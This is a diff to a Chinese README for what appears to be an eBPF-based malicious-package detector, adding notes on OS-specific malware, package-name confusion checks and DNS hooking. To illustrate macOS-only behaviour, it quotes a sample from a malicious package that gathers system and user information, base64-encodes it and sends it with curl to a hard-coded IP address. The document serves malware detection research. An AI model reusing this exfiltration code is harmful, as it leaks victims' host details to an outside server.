@@ -196,7 +196,40 @@ int kprobe_do_sys_openat2(struct pt_regs *ctx)
 - server中的runner.py判责逻辑只做简单黑白名单规则，没有根据多hook信息中pid做关联、聚合等逻辑
 
 ## 0x04 feature
-### dns hook
+### 4.1 特定OS恶意行为触发
+发现部分恶意包会判断操作系统类型，在macos下会执行采集信息等恶意动作，由于ebpf运行在linux下故暂时不能触发恶意行为并检出，故暂时是否可以通过AST的方式去做白盒的检出。对应feature_ast_os_diff分支，恶意包举例：
+```python
+kwxiaodian
+
+if sys.platform == 'darwin':
+    def get_info():
+        version = sys.version
+        uname_string = str(os.popen("uname -a").read())
+        id_string = str(os.popen("id").read())
+        pwd_string = str(os.popen('pwd').read())
+        ip_string = str(os.popen('ifconfig').read())
+        info = {
+            "uname": uname_string,
+            "id": id_string,
+            "pwd": pwd_string,
+            "ip": ip_string
+        }
+        if version[0] == '2':
+            info = base64.b64encode(json.dumps(info))
+        else:
+            info = base64.b64encode(json.dumps(info).encode('utf-8')).decode()
+        print(info)
+
+        url = 'http:/81.70.191.194:14333/start/' + info
+        os.system('curl -m 3 -s -o /dev/null ' + url)
+```
+
+### 4.2 报名混淆相似度检出
+看到[Beyond Typosquatting, An In-depth Look at
+Package Confusion
+](https://www.usenix.org/system/files/sec23_slides_neupane.pdf) 其中提到13中容易混淆导致误用package的情况，故是否可以利用当前已检出的packagename、全量package做样本判断是否是恶意包，用来做辅助分析。
+
+### 4.3 dns hook
 通过hook```getaddrinfo```函数可以获取通过curl/wget等方式的dns查询，但是无法获取nslook不通过getaddrinfo函数的数据
 相关恶意包case  
 
